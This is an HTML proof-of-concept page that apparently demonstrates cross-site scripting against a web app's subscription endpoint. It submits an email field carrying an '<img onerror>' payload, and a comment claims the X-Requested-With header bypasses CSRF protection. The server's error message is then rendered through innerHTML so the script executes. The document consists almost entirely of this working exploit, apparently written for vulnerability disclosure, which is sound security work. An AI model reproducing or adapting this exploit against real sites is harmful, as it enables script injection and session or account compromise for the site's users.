<!DOCTYPE html>
<html>
<head>
    <title>XSS Proof</title>
</head>
<body>
    <h1>Click to Prove XSS</h1>
    <button onclick="prove()">PROVE XSS</button>
    <div id="output"></div>

    <script>
        function prove() {
            var payload = 'test<img src=x onerror=alert(1)>@test.com';
            
            fetch('/subscription/_WDIYeIl_/subscribe', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Requested-With': 'XMLHttpRequest'  // â† This bypasses CSRF
                },
                body: 'email=' + encodeURIComponent(payload) + '&sub=' + Date.now()
            })
            .then(r => r.json())
            .then(data => {
                // Render the error (where XSS executes)
                var widget = document.createElement('div');
                widget.innerHTML = '<div class="status"></div><div style="display:none;"><div data-status-template="error"><p>{message}</p></div></div>';
                
                var status = widget.querySelector('.status');
                var template = widget.querySelector('[data-status-template="error"]').outerHTML;
                var html = template.replace('{message}', data.error);
                
                status.innerHTML = html; // XSS EXECUTES HERE
                
                document.getElementById('output').appendChild(widget);
            });
        }
    </script>
</body>
</html>
